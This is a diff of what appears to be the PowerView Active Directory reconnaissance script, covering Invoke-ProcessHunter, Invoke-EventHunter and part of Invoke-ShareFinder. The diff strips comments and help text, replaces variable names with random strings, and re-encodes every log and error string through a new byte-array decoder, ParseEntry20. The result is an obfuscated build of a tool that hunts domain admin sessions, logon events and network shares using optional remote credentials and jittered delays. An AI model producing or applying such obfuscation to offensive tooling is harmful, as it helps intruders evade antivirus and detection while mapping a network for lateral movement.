             $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
             if($($ComputerName.Count) -eq 0) {
-                throw (HandleResult95 @(217,30,74,99,47,202,74,8,96,6,192,20,40,105,119,188,17,31,85,38) @(141,115,114,4,78))
+                throw (ParseEntry20 @(46,230,238,189,171,61,178,172,190,130,55,236,140,183,243,75,233,187,139,162) @(122,139,214,218,202))
             }
         }
-
-        #####################################################
-        #
-        # Now we build the user target set
-        #
-        #####################################################
-
         if(!$ProcessName) {
-            Write-Verbose (HandleResult95 @(70,29,31,251,195,29,155,100,41,21,202,218,54,168,80,5,126,203,145,57,152,90,62,80,198,247,27,161,72,29,75,240,250,22,166,117,41,73,202,208,55,150,64,0,69,241,195,50,136,65,50,23,197,248,31,191,72,40,118,251,196,13,159,126,19,78,222,218,15,137,67,77) @(18,112,39,156,160,85,209))
-
-            # users we're going to be searching for
+            Write-Verbose (ParseEntry20 @(26,246,100,93,86,6,209,42,99,7,24,225,63,67,119,59,194,11,11,89,7,211,18,77,111,25,213,44,96,88,34,247,6,121,66,41,194,50,108,69,44,220,14,74,87,35,248,59,99,102,12,171,5,98,127,32,193,4,107,82,42,195,18,86,86,39,217,38,96,109,31,166) @(78,155,92,58,53))
             $TargetUsers = @()
-
-            # if we want to hunt for the effective domain users who can access a target server
             if($TargetServer) {
-                Write-Verbose ((HandleResult95 @(246,120,112,96,176,250,254,211,66,75,111,180,240,213,229,89,124,62,133,164,219,235,110,74,111,189,206,254,192,73,103,98) @(163,32,38,12,211,148,146)) + $TargetServer + (HandleResult95 @(115,58,73,48,5,10,10,108,63,32,0,41,82,10,16,94,39,83,19,11,90,45,70,96) @(57,67,11,93,103)))
+                Write-Verbose ((ParseEntry20 @(59,92,23,144,218,0,104,49,158,212,13,99,37,187,255,23,94,115,170,137,39,76,15,144,218,0,94,45,159,208,47,106) @(110,4,65,252,185)) + $TargetServer + (ParseEntry20 @(10,248,34,68,130,141,255,39,227,39,16,138,231,225,55,230,4,113,174,210,213,46,204,93) @(64,129,96,41,224,190,182)))
                 $TargetUsers = Get-NetLocalGroup $TargetServer -Recurse | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {
                     ($_.AccountName).split("/")[1].toLower()
                 }  | Where-Object {$_}
             }
-            # if we get a specific username, only use that
             elseif($UserName) {
-                Write-Verbose ((HandleResult95 @(27,203,32,143,30,117,26,200,49,188,98,93,5,250,2,131,52,94,40,222,52,168,21,2,47,128,6,146,30,112,47,143) @(76,178,80,235,87,51)) + $UserName + (HandleResult95 @(119,137,2,112,63,139,148,0) @(61,240,54,5,115,236,169)))
+                Write-Verbose ((ParseEntry20 @(189,98,16,76,167,212,92,76,139,76,85,70,167,218,88,94,137,118,4,68,138,209,72,7,137,41,54,81,167,209,105,11) @(234,27,96,40,238,146,10,54)) + $UserName + (ParseEntry20 @(188,26,252,99,101,133,176,203) @(246,99,200,22,41,226,141)))
                 $TargetUsers = @( $UserName.ToLower() )
             }
-            # read in a target user list if we have one
             elseif($UserFile) {
                 $TargetUsers = Get-Content -Path $UserFile | Where-Object {$_}
             }
             elseif($UserADSpath -or $UserFilter) {
-                ForEach ($Domain in $ajPzEg) {
-                    Write-Verbose ((HandleResult95 @(192,159,197,216,5,195,112,166,188,237,246,121,228,97,162,136,252,251,30,243,84,192,160,197,222,37,196,11) @(151,230,181,188,76,133,54)) + $Domain + (HandleResult95 @(55,244,236,91,75,118,100,79,208,132,123,81,124,81,67,142) @(126,179,182,45,40,31,38)))
+                ForEach ($Domain in $k8fkcV) {
+                    Write-Verbose ((ParseEntry20 @(46,56,237,52,48,7,219,97,35,25,215,101,24,22,168,62,48,6,207,38,27,22,219,32,27,40,220,109) @(121,65,157,80)) + $Domain + (ParseEntry20 @(219,210,139,150,104,88,86,163,246,227,182,114,82,99,175,168) @(146,149,209,224,11,49,20)))
                     $TargetUsers += Get-NetUser -Domain $Domain -DomainController $DomainController -ADSpath $UserADSpath -Filter $UserFilter | ForEach-Object {
                         $_.samaccountname
                     }  | Where-Object {$_}
                 }            
             }
             else {
-                ForEach ($Domain in $ajPzEg) {
-                    Write-Verbose ((HandleResult95 @(161,187,242,147,191,132,196,198,172,154,200,194,151,149,183,153,191,133,208,129,148,149,196,135,148,171,195,202) @(246,194,130,247)) + $Domain + (HandleResult95 @(5,7,170,230,47,41,178,161,47,114,166,233,47,57,178,230,22,41,178,254,47,45,201,161,47,3,177,254) @(76,64,240,144)) + $GroupName + "'")
+                ForEach ($Domain in $k8fkcV) {
+                    Write-Verbose ((ParseEntry20 @(181,183,101,209,171,136,83,132,184,150,95,128,131,153,32,219,171,137,71,195,128,153,83,197,128,167,84,136) @(226,206,21,181)) + $Domain + (ParseEntry20 @(231,132,112,138,217,121,206,159,160,24,170,195,115,245,236,181,112,149,248,126,239,195,250,27,159,249,81,226) @(174,195,42,252,186,16,140)) + $GroupName + "'")
                     $TargetUsers += Get-NetGroupMember -GroupName $GroupName -Domain $Domain -DomainController $DomainController| Foreach-Object {
                         $_.MemberName
                     }
                 }
             }
-
             if ((-not $ShowAll) -and ((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {
-                throw (HandleResult95 @(205,103,148,238,220,6,175,104,155,194,195,57,192,70,152,240,220,4,192,104,182,221,160,40,211,86,128,252,220,11,212,114,139,210,223,41,251,93,144,231,247,112,211,118) @(154,30,210,138,149,67))
+                throw (ParseEntry20 @(164,204,125,77,186,240,14,95,186,253,109,83,169,237,113,83,186,242,97,95,151,226,14,66,186,253,105,95,186,253,117,69,170,237,113,67,146,246,121,68,145,134,114,65) @(243,181,59,41))
             }
         }
-
-        # script block that enumerates a server
-        $h6EYtum2 = {
+        $s8TS = {
             param($ComputerName, $Ping, $ProcessName, $TargetUsers, $RemoteUserName, $RemotePassword)
-
-            # optionally check if the server is up first
-            $yssh = $True
+            $lPdgSYQ = $True
             if($Ping) {
-                $yssh = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
+                $lPdgSYQ = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
             }
-            if($yssh) {
-                # try to enumerate all active processes on the remote host
-                # and search for a specific process name
+            if($lPdgSYQ) {
                 if($RemoteUserName -and $RemotePassword) {
-                    $oWBV8 = Get-NetProcess -RemoteUserName $RemoteUserName -RemotePassword $RemotePassword -ComputerName $ComputerName -ErrorAction SilentlyContinue
+                    $x3yp9 = Get-NetProcess -RemoteUserName $RemoteUserName -RemotePassword $RemotePassword -ComputerName $ComputerName -ErrorAction SilentlyContinue
                 }
                 else {
-                    $oWBV8 = Get-NetProcess -ComputerName $ComputerName -ErrorAction SilentlyContinue
+                    $x3yp9 = Get-NetProcess -ComputerName $ComputerName -ErrorAction SilentlyContinue
                 }
-
-                ForEach ($Process in $oWBV8) {
-                    # if we're hunting for a process name or comma-separated names
+                ForEach ($Process in $x3yp9) {
                     if($ProcessName) {
                         $ProcessName.split(",") | ForEach-Object {
                             if ($Process.ProcessName -match $_) {
@@ -8675,1105 +4331,530 @@ function Invoke-ProcessHunter {
                             }
                         }
                     }
-                    # if the session user is in the target list, display some output
                     elseif ($TargetUsers -contains $Process.User) {
                         $Process
                     }
                 }
             }
         }
-
     }
-
     process {
-
         if($Threads) {
-            Write-Verbose ((HandleResult95 @(176,147,165,182,29,120,56,129,175,172,174,6,79,12,160,160,138,145,74,123,18,174,175,155,162,56,114,60,130,140,131,191,37,66,29,141,168,146,135,70,92,26,219,246) @(230,203,235,198,127,21,91)) + $Threads)
-
-            # if we're using threading, kick off the script block with Invoke-ThreadedFunction
-            $O2kwi = @{
+            Write-Verbose ((ParseEntry20 @(18,179,8,138,38,134,37,157,32,172,46,131,30,188,0,145,37,188,115,148,13,163,34,138,32,172,33,157,32,172,46,131,30,188,0,145,39,146,7,195,13,170,123,199) @(68,235,70,250)) + $Threads)
+            $n3XrNi5 = @{
                 'Ping' = $(-not $NoPing)
                 'ProcessName' = $ProcessName
                 'TargetUsers' = $TargetUsers
                 'RemoteUserName' = $RemoteUserName
                 'RemotePassword' = $RemotePassword
             }
-
-            # kick off the threaded script block + arguments 
-            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $h6EYtum2 -ScriptParameters $O2kwi
+            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $s8TS -ScriptParameters $n3XrNi5
         }
-
         else {
             if(-not $NoPing -and ($ComputerName.count -ne 1)) {
-                # ping all hosts in parallel
                 $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                 $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
             }
-
-            Write-Verbose ((HandleResult95 @(88,28,179,94,242,201,93,19,167,125,253,252,70,34,246,11,217,216,69,9,160,83,249,249,85,12,129,82,226,188,93,21,167,87,238,232,110,34,250,64,223,199,66,83,138,123,134,178) @(15,101,195,58,187,143)) + $($ComputerName.count))
-            $ypmBN = 0
-
-            ForEach ($fa0ya in $ComputerName) {
-
-                $ypmBN = $ypmBN + 1
-
-                # sleep for our semi-randomized interval
-                Start-Sleep -Seconds $WLAr.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
-
-                Write-Verbose ((HandleResult95 @(56,238,46,244,38,210,8,229,11,192,111,252,12,250,24,160,14,192,107,254,38,223,16,252,12,249,4,252,12,254,31,173) @(111,151,94,144)) + $fa0ya + ([char]0x20+[char]0x28) + $ypmBN + (HandleResult95 @(158,48,86,18,87,252,174,234) @(215,119,111,127,30,189,147)) + $($ComputerName.count) + ")")
-                $e9hz = Invoke-Command -ScriptBlock $h6EYtum2 -ArgumentList $fa0ya, $False, $ProcessName, $TargetUsers, $RemoteUserName, $RemotePassword
-                $e9hz
-
-                if($e9hz -and $StopOnSuccess) {
-                    Write-Verbose (HandleResult95 @(58,10,255,63,251,230,63,27,236,54,214,204,9,48,205,106,209,146,59,10,195,104,240,217,15,65,193,55,209,147,32,20,213,54,139,145,15,30,222,40,251,232,39,31,235,19,228,217,15,30,227,46,232,217,47,31,214,3,248,211,8,34,178,102) @(109,115,143,91,178,160))
+            Write-Verbose ((ParseEntry20 @(37,247,83,204,0,111,188,8,22,201,101,219,0,110,219,79,16,217,105,196,42,64,172,8,40,231,97,192,16,26,188,14,22,227,118,207,40,110,215,4,22,198,110,158,0,104,211,67) @(114,142,35,168,73,41,238,126)) + $($ComputerName.count))
+            $o6bG = 0
+            ForEach ($mnZ6k in $ComputerName) {
+                $o6bG = $o6bG + 1
+                Start-Sleep -Seconds $BiHWqPVB.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
+                Write-Verbose ((ParseEntry20 @(191,39,201,215,222,47,6,230,140,9,136,223,244,7,22,163,137,9,140,221,222,34,30,255,139,48,227,223,244,3,17,174) @(232,94,185,179,151,106,80,147)) + $mnZ6k + ([char]0x20+[char]0x28) + $o6bG + (ParseEntry20 @(87,188,237,121,47,230,182,35) @(30,251,212,20,102,167,139)) + $($ComputerName.count) + ")")
+                $NW6jRjlY = Invoke-Command -ScriptBlock $s8TS -ArgumentList $mnZ6k, $False, $ProcessName, $TargetUsers, $RemoteUserName, $RemotePassword
+                $NW6jRjlY
+                if($NW6jRjlY -and $StopOnSuccess) {
+                    Write-Verbose (ParseEntry20 @(51,146,233,218,95,169,191,180,7,134,253,210,114,172,175,237,7,217,207,199,90,220,175,165,6,217,215,210,117,220,160,187,62,134,160,143,116,130,188,175,45,163,211,210,114,167,187,165,6,134,245,203,76,150,175,176,61,179,211,205,115,190,208,225) @(100,235,153,190,22,239,237,220))
                     return
                 }
             }
         }
-
     }
 }
-
-
 function Invoke-EventHunter {
-<#
-    .SYNOPSIS
-
-        Queries all domain controllers on the network for account
-        logon events (ID 4624) and TGT request events (ID 4768),
-        searching for target users.
-
-        Note: Domain Admin (or equiv) rights are needed to query
-        this information from the DCs.
-
-        Author: @sixdub, @harmj0y
-        License: BSD 3-Clause
-
-    .PARAMETER ComputerName
-
-        Host array to enumerate, passable on the pipeline.
-
-    .PARAMETER ComputerFile
-
-        File of hostnames/IPs to search.
-
-    .PARAMETER ComputerFilter
-
-        Host filter name to query AD for, wildcards accepted.
-
-    .PARAMETER ComputerADSpath
-
-        The LDAP source to search through for hosts, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-        Useful for OU queries.
-
-    .PARAMETER GroupName
-
-        Group name to query for target users.
-
-    .PARAMETER TargetServer
-
-        Hunt for users who are effective local admins on a target server.
-
-    .PARAMETER UserName
-
-        Specific username to search for.
-
-    .PARAMETER UserFilter
-
-        A customized ldap filter string to use for user enumeration, e.g. "(description=*admin*)"
-
-    .PARAMETER UserADSpath
-
-        The LDAP source to search through for users, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-        Useful for OU queries.
-
-    .PARAMETER UserFile
-
-        File of usernames to search for.
-
-    .PARAMETER NoPing
-
-        Don't ping each host to ensure it's up before enumerating.
-
-    .PARAMETER Domain
-
-        Domain for query for machines, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER SearchDays
-
-        Number of days back to search logs for. Default 3.
-
-    .PARAMETER SearchForest
-
-        Switch. Search all domains in the forest for target users instead of just
-        a single domain.
-
-    .PARAMETER Threads
-
-        The maximum concurrent threads to execute.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-EventHunter
-
-    .LINK
-
-        http://blog.harmj0y.net
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(Position=0,ValueFromPipeline=$True)]
         [Alias('Hosts')]
         [String[]]
         $ComputerName,
-
         [ValidateScript({Test-Path -Path $_ })]
         [Alias('HostList')]
         [String]
         $ComputerFile,
-
         [String]
         $ComputerFilter,
-
         [String]
         $ComputerADSpath,
-
         [String]
         $GroupName = 'Domain Admins',
-
         [String]
         $TargetServer,
-
         [String]
         $UserName,
-
         [String]
         $UserFilter,
-
         [String]
         $UserADSpath,
-
         [ValidateScript({Test-Path -Path $_ })]
         [String]
         $UserFile,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [Int32]
         $SearchDays = 3,
-
         [Switch]
         $SearchForest,
-
         [ValidateRange(1,100)] 
         [Int]
         $Threads
     )
-
     begin {
-
         if ($PSBoundParameters['Debug']) {
             $DebugPreference = 'Continue'
         }
-
-        # random object for delay
-        $WLAr = New-Object System.Random
-
-        Write-Verbose (HandleResult95 @(112,18,107,82,110,45,81,7,69,6,46,70,69,6,120,81,116,60,46,4,69,89,111,90,107,62,77,4,125,60,46,6,116,35,77,67,67,44,77,79) @(39,107,27,54))
-
+        $BiHWqPVB = New-Object System.Random
+        Write-Verbose (ParseEntry20 @(99,211,222,223,80,229,126,155,204,214,44,211,86,199,205,220,74,244,1,152,204,137,109,207,120,255,248,137,67,244,1,154,253,243,79,214,80,237,248,194) @(52,170,174,187,25,163))
         if($Domain) {
-            $ajPzEg = @($Domain)
+            $k8fkcV = @($Domain)
         }
         elseif($SearchForest) {
-            # get ALL the domains in the forest to search
-            $ajPzEg = Get-NetForestDomain | ForEach-Object { $_.Name }
+            $k8fkcV = Get-NetForestDomain | ForEach-Object { $_.Name }
         }
         else {
-            # use the local domain
-            $ajPzEg = @( (Get-NetDomain).name )
+            $k8fkcV = @( (Get-NetDomain).name )
         }
-
-        #####################################################
-        #
-        # First we build the host target set
-        #
-        #####################################################
-
         if(!$ComputerName) { 
-            # if we're using a host list, read the targets in and add them to the target list
             if($ComputerFile) {
                 $ComputerName = Get-Content -Path $ComputerFile
             }
             elseif($ComputerFilter -or $ComputerADSpath) {
                 [array]$ComputerName = @()
-                ForEach ($Domain in $ajPzEg) {
-                    Write-Verbose ((HandleResult95 @(205,5,203,222,135,244,65,171,38,227,240,251,211,80,175,18,242,253,156,196,101,205,58,203,216,167,243,58) @(154,124,187,186,206,178,7)) + $Domain + (HandleResult95 @(178,229,228,207,121,104,245,148,192,141,247,42,98,192,198,159) @(251,162,190,185,26,1,183)))
+                ForEach ($Domain in $k8fkcV) {
+                    Write-Verbose ((ParseEntry20 @(179,205,155,92,187,162,242,218,98,170,174,129,138,111,199,138,253,172,106,132,134,227,173,72,144,141,245,214) @(228,180,235,56,242)) + $Domain + (ParseEntry20 @(148,137,65,114,209,180,140,116,102,129,147,254,120,115,143,224) @(221,206,27,4,178)))
                     $ComputerName += Get-NetComputer -Domain $Domain -DomainController $DomainController -Filter $ComputerFilter -ADSpath $ComputerADSpath
                 }
             }
             else {
-                # if a computer specifier isn't given, try to enumerate all domain controllers
                 [array]$ComputerName = @()
-                ForEach ($Domain in $ajPzEg) {
-                    Write-Verbose ((HandleResult95 @(73,143,39,166,159,108,133,118,68,174,29,247,183,125,246,41,87,177,5,180,180,125,133,55,124,159,22,255) @(30,246,87,194,214,42,195,71)) + $Domain + (HandleResult95 @(214,217,106,26,12,232,221,245,82,94,94,233,254,201,4,11,54,179,166,235,84,36,37,247,253,217,72,0,12,239,210,163) @(159,158,48,108,111,129)))
+                ForEach ($Domain in $k8fkcV) {
+                    Write-Verbose ((ParseEntry20 @(181,177,23,228,212,43,244,108,184,144,45,181,252,58,135,51,171,143,53,246,255,58,244,45,128,161,38,189) @(226,200,103,128,157,109,178,93)) + $Domain + (ParseEntry20 @(180,250,181,209,205,148,255,132,197,156,204,213,142,240,154,154,228,221,158,219,153,245,165,209,204,186,197,131,196,192,176,128) @(253,189,239,167,174)))
                     $ComputerName += Get-NetDomainController -LDAP -Domain $Domain -DomainController $DomainController | ForEach-Object { $_.dnshostname}
                 }
             }
-
-            # remove any null target hosts, uniquify the list and shuffle it
             $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
             if($($ComputerName.Count) -eq 0) {
-                throw (HandleResult95 @(59,19,172,15,169,40,71,238,12,128,34,25,206,5,241,94,28,249,57,160) @(111,126,148,104,200))
+                throw (ParseEntry20 @(16,99,13,154,196,7,125,116,81,181,232,39,30,99,12,204,199,45,21,102) @(68,14,53,253,165,64))
             }
         }
-
-        #####################################################
-        #
-        # Now we build the user target set
-        #
-        #####################################################
-
-        # users we're going to be searching for
         $TargetUsers = @()
-
-        # if we want to hunt for the effective domain users who can access a target server
         if($TargetServer) {
-            Write-Verbose ((HandleResult95 @(193,98,71,118,249,246,248,74,115,119,249,255,240,125,87,99,192,170,194,10,88,82,212,244,247,84,75,118,249,241,213,84) @(148,58,17,26,154,152)) + $TargetServer + (HandleResult95 @(159,0,15,72,131,230,48,42,71,166,236,19,20,114,150,178,29,21,107,141,182,23,0,24) @(213,121,77,37,225)))
+            Write-Verbose ((ParseEntry20 @(101,230,61,63,95,106,188,64,220,6,48,91,96,151,118,199,49,97,106,52,153,120,240,7,48,82,94,188,83,215,42,61) @(48,190,107,83,60,4,208)) + $TargetServer + (ParseEntry20 @(2,145,133,9,61,121,13,2,42,175,254,14,6,29,51,2,44,176,137,8,60,36,9,88) @(72,232,199,100,95,74,68,101)))
             $TargetUsers = Get-NetLocalGroup $TargetServer -Recurse | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {
                 ($_.AccountName).split("/")[1].toLower()
             }  | Where-Object {$_}
         }
-        # if we get a specific username, only use that
         elseif($UserName) {
-            Write-Verbose ((HandleResult95 @(213,154,218,51,34,0,236,248,130,253,98,5,15,242,208,139,201,58,15,42,222,193,161,155,52,89,16,195,203,160,201,106) @(130,227,170,87,107,70,186)) + $UserName + (HandleResult95 @(124,18,101,96,124,81,86,108) @(54,107,81,21,48)))
+            Write-Verbose ((ParseEntry20 @(175,142,108,53,175,236,174,141,125,6,211,196,177,191,78,57,133,199,156,155,120,18,164,155,155,197,74,40,175,233,155,202) @(248,247,28,81,230,170)) + $UserName + (ParseEntry20 @(98,74,88,157,100,84,81,213) @(40,51,108,232)))
             $TargetUsers = @( $UserName.ToLower() )
         }
-        # read in a target user list if we have one
         elseif($UserFile) {
             $TargetUsers = Get-Content -Path $UserFile | Where-Object {$_}
         }
         elseif($UserADSpath -or $UserFilter) {
-            ForEach ($Domain in $ajPzEg) {
-                Write-Verbose ((HandleResult95 @(125,174,120,191,153,14,148,27,141,80,145,229,41,133,31,185,65,156,130,62,176,125,145,120,185,185,9,239) @(42,215,8,219,208,72,210)) + $Domain + (HandleResult95 @(161,66,41,176,130,61,170,52,16,244,183,45,139,114,78,251) @(232,5,115,198,225,84)))
+            ForEach ($Domain in $k8fkcV) {
+                Write-Verbose ((ParseEntry20 @(248,84,76,238,34,63,233,28,102,210,33,76,206,122,9,228,34,62,253,91,94,221,45,9,205,68,125,183) @(175,45,60,138,107,121)) + $Domain + (ParseEntry20 @(77,248,63,111,248,109,253,84,122,169,82,198,6,110,166,57) @(4,191,101,25,155)))
                 $TargetUsers += Get-NetUser -Domain $Domain -DomainController $DomainController -ADSpath $UserADSpath -Filter $UserFilter | ForEach-Object {
                     $_.samaccountname
                 }  | Where-Object {$_}
             }            
         }
         else {
-            ForEach ($Domain in $ajPzEg) {
-                Write-Verbose ((HandleResult95 @(246,155,76,19,102,231,164,13,45,119,235,215,93,32,26,207,171,123,37,89,195,181,122,7,77,200,163,1) @(161,226,60,119,47)) + $Domain + (HandleResult95 @(153,212,173,47,139,132,51,238,179,161,161,32,139,148,51,169,138,250,181,55,139,128,72,238,179,208,182,55) @(208,147,247,89,232,237,113,223)) + $GroupName + "'")
+            ForEach ($Domain in $k8fkcV) {
+                Write-Verbose ((ParseEntry20 @(254,7,232,195,126,170,37,106,243,38,210,146,86,187,86,53,224,57,202,209,85,187,37,43,203,23,217,154) @(169,126,152,167,55,236,99,91)) + $Domain + (ParseEntry20 @(120,122,74,158,213,88,127,33,139,132,103,68,115,145,244,71,103,121,170,216,82,80,41,217,213,114,124,126) @(49,61,16,232,182)) + $GroupName + "'")
                 $TargetUsers += Get-NetGroupMember -GroupName $GroupName -Domain $Domain -DomainController $DomainController | Foreach-Object {
                     $_.MemberName
                 }
             }
         }
-
         if (((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {
-            throw (HandleResult95 @(216,222,238,121,225,202,146,222,84,224,217,221,242,69,226,245,238,239,71,222,235,240,157,118,225,199,245,222,84,224,193,203,241,69,226,229,198,235,95,197,237,148,225,117) @(143,167,168,29,168))
+            throw (ParseEntry20 @(151,220,93,36,117,115,245,211,82,8,106,76,154,253,81,58,117,113,154,211,127,23,9,93,137,237,73,54,117,126,142,201,66,24,118,92,161,230,89,45,94,5,137,205) @(192,165,27,64,60,54))
         }
-
-        # script block that enumerates a server
-        $h6EYtum2 = {
+        $s8TS = {
             param($ComputerName, $Ping, $TargetUsers, $SearchDays)
-
-            # optionally check if the server is up first
-            $yssh = $True
+            $lPdgSYQ = $True
             if($Ping) {
-                $yssh = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
+                $lPdgSYQ = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
             }
-            if($yssh) {
-                # try to enumerate 
+            if($lPdgSYQ) {
                 Get-UserEvent -ComputerName $ComputerName -EventType 'all' -DateStart ([DateTime]::Today.AddDays(-$SearchDays)) | Where-Object {
-                    # filter for the target user set
                     $TargetUsers -contains $_.UserName
                 }
             }
         }
-
     }
-
     process {
-
         if($Threads) {
-            Write-Verbose ((HandleResult95 @(28,2,42,254,156,10,201,45,62,35,230,135,61,253,12,49,5,217,203,9,227,2,62,20,234,185,0,205,46,29,12,247,164,48,236,33,57,29,207,199,46,235,119,103) @(74,90,100,142,254,103,170)) + $Threads)
-
-            # if we're using threading, kick off the script block with Invoke-ThreadedFunction
-            $O2kwi = @{
+            Write-Verbose ((ParseEntry20 @(200,166,101,15,126,111,253,153,79,56,116,123,196,169,109,20,125,85,171,144,98,55,120,114,250,185,76,24,120,69,246,135,113,40,90,105,253,135,106,70,85,67,163,195) @(158,254,43,127,28,2)) + $Threads)
+            $n3XrNi5 = @{
                 'Ping' = $(-not $NoPing)
                 'TargetUsers' = $TargetUsers
                 'SearchDays' = $SearchDays
             }
-
-            # kick off the threaded script block + arguments 
-            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $h6EYtum2 -ScriptParameters $O2kwi
+            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $s8TS -ScriptParameters $n3XrNi5
         }
-
         else {
             if(-not $NoPing -and ($ComputerName.count -ne 1)) {
-                # ping all hosts in parallel
                 $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                 $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
             }
-
-            Write-Verbose ((HandleResult95 @(22,187,245,81,55,7,144,243,81,57,7,177,204,114,75,112,160,210,127,18,34,171,199,67,36,40,128,237,108,77,19,178,225,88,43,38,163,194,12,4,37,138,200,3,55,0,255,184) @(65,194,133,53,126)) + $($ComputerName.count))
-            $ypmBN = 0
-
-            ForEach ($fa0ya in $ComputerName) {
-
-                $ypmBN = $ypmBN + 1
-
-                # sleep for our semi-randomized interval
-                Start-Sleep -Seconds $WLAr.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
-
-                Write-Verbose ((HandleResult95 @(219,164,120,63,224,99,112,249,185,95,106,197,69,75,202,237,105,12,156,72,111,196,147,100,56,199,124,74,239,180,73,102) @(140,221,8,91,169,38,38)) + $fa0ya + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICg="))) + $ypmBN + (HandleResult95 @(89,41,126,54,50,218,211,163) @(16,110,71,91,123,155,238,158)) + $($ComputerName.count) + ")")
-                Invoke-Command -ScriptBlock $h6EYtum2 -ArgumentList $fa0ya, $(-not $NoPing), $TargetUsers, $SearchDays
+            Write-Verbose ((ParseEntry20 @(17,46,163,228,53,115,83,48,51,148,198,15,124,70,115,102,177,215,54,89,98,47,21,165,218,21,119,105,31,100,129,240,24,88,84,33,54,148,185,6,81,73,11,97,154,193,65,8) @(70,87,211,128,124,53,1)) + $($ComputerName.count))
+            $o6bG = 0
+            ForEach ($mnZ6k in $ComputerName) {
+                $o6bG = $o6bG + 1
+                Start-Sleep -Seconds $BiHWqPVB.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
+                Write-Verbose ((ParseEntry20 @(79,95,189,115,47,93,112,184,115,49,41,74,174,122,32,40,71,154,34,8,81,110,131,123,5,118,124,161,116,15,89,27) @(24,38,205,23,102)) + $mnZ6k + ([char]0x20+[char]0x28) + $o6bG + (ParseEntry20 @(135,193,223,188,135,199,219,236) @(206,134,230,209)) + $($ComputerName.count) + ")")
+                Invoke-Command -ScriptBlock $s8TS -ArgumentList $mnZ6k, $(-not $NoPing), $TargetUsers, $SearchDays
             }
         }
-
     }
 }
-
-
 function Invoke-ShareFinder {
-<#
-    .SYNOPSIS
-
-        This function finds the local domain name for a host using Get-NetDomain,
-        queries the domain for all active machines with Get-NetComputer, then for
-        each server it lists of active shares with Get-NetShare. Non-standard shares
-        can be filtered out with -Exclude* flags.
-
-        Author: @harmj0y
-        License: BSD 3-Clause
-
-    .PARAMETER ComputerName
-
-        Host array to enumerate, passable on the pipeline.
-
-    .PARAMETER ComputerFile
-
-        File of hostnames/IPs to search.
-
-    .PARAMETER ComputerFilter
-
-        Host filter name to query AD for, wildcards accepted.
-
-    .PARAMETER ComputerADSpath
-
-        The LDAP source to search through for hosts, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-        Useful for OU queries.
-
-    .PARAMETER ExcludeStandard
-
-        Switch. Exclude standard shares from display (C$, IPC$, print$ etc.)
-
-    .PARAMETER ExcludePrint
-
-        Switch. Exclude the print$ share.
-
-    .PARAMETER ExcludeIPC
-
-        Switch. Exclude the IPC$ share.
-
-    .PARAMETER CheckShareAccess
-
-        Switch. Only display found shares that the local user has access to.
-
-    .PARAMETER CheckAdmin
-
-        Switch. Only display ADMIN$ shares the local user has access to.
-
-    .PARAMETER NoPing
-
-        Switch. Don't ping each host to ensure it's up before enumerating.
-
-    .PARAMETER Delay
-
-        Delay between enumerating hosts, defaults to 0.
-
-    .PARAMETER Jitter
-
-        Jitter for the host delay, defaults to +/- 0.3.
-
-    .PARAMETER Domain
-
-        Domain to query for machines, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER SearchForest
-
-        Switch. Search all domains in the forest for target users instead of just
-        a single domain.
-
-    .PARAMETER Threads
-
-        The maximum concurrent threads to execute.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-ShareFinder -ExcludeStandard
-
-        Find non-standard shares on the domain.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-ShareFinder -Threads 20
-
-        Multi-threaded share finding, replaces Invoke-ShareFinderThreaded.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-ShareFinder -Delay 60
-
-        Find shares on the domain with a 60 second (+/- *.3)
-        randomized delay between touching each host.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-ShareFinder -ComputerFile hosts.txt
-
-        Find shares for machines in the specified hosts file.
-
-    .LINK
-    http://blog.harmj0y.net
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(Position=0,ValueFromPipeline=$True)]
         [Alias('Hosts')]
         [String[]]
         $ComputerName,
-
         [ValidateScript({Test-Path -Path $_ })]
         [Alias('HostList')]
         [String]
         $ComputerFile,
-
         [String]
         $ComputerFilter,
-
         [String]
         $ComputerADSpath,
-
         [Switch]
         $ExcludeStandard,
-
         [Switch]
         $ExcludePrint,
-
         [Switch]
         $ExcludeIPC,
-
         [Switch]
         $NoPing,
-
         [Switch]
         $CheckShareAccess,
-
         [Switch]
         $CheckAdmin,
-
         [UInt32]
         $Delay = 0,
-
